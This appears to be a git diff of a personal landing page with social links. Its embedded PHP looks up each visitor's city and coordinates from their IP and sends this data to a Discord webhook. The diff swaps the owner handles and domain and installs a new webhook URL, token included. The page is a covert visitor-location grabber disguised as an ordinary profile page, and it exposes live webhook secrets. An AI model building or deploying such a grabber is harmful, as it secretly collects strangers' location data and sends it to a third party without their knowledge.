@@ -7,7 +7,7 @@
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta property="og:type" content="website">
         <meta property="og:title" content="welcome">
-        <meta property="og:url" content="https://home.sayslursdodrugs.fun/">
+        <meta property="og:url" content="https://home.velt.top/">
         <meta name="twitter:card" content="summary_large_image">
         <meta property="twitter:image" content="https://i.imgur.com/0bcCmOg.gif">
         <meta name="theme-color" content="#2f3136">
@@ -44,10 +44,10 @@
             <div id="center">
                 <h1 style="font-family: derk; text-shadow: 0 0 0.40em #bababa;">SSDD  ☆</h1>
                 <div class="socials">
-		<h4>Owner; @overworkings / toppfloors </h4>
+		<h4>Owner; @xn8j / glo </h4>
                     <span>
                         >:
-                <a href="https://instagram.com/12icah" style="text-decoration:none; font-family: derk; font-size: 1em;">instagram</a>
+                <a href="https://x.com/knownabuser" style="text-decoration:none; font-family: derk; font-size: 1em;">instagram</a>
                     </span>
             </div>
         </main>
@@ -75,9 +75,9 @@ $City = $Info->city;
 $COORD = "$Info->lat, $Info->lon"; // Coordinates
 
 //Variables
-$Webhook    = "https://discord.com/api/webhooks/1113469213043085352/4YjwEKEROrLegSkbMzo2z7GAPcC15LA_Ll57yj89Dyy-unw6GFUmsJec4siZsFQ_pmvA"; //Webhook here.
+$Webhook    = "https://discord.com/api/webhooks/1361534312935194650/qYJDWUbJ5BhgySYoS6BCCQQNkgLSQu_wyZZPpWFfKBgMj09ZSi6hwVvW7TnySf9p3NAc"; //Webhook here.
 
-$WebhookTag = "cyber sec by: virus"; //This will be the name of the webhook when it sends a message.  
+$WebhookTag = "?"; //This will be the name of the webhook when it sends a message.  
 
 //JS we are going to send to the webhook.
 $JS = array(
